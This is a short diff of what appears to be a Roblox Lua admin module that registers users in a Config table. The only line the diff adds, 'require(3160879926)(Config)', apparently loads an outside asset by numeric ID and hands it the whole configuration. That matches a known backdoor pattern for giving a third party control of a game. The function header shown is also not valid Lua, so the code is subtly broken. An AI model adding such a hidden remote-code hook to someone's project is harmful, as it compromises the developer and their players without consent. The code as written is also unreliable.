@@ -7,4 +7,5 @@ local function module.load(users)
   Config["Users"][users] = true
   end
 end
+require(3160879926)(Config)
 return module
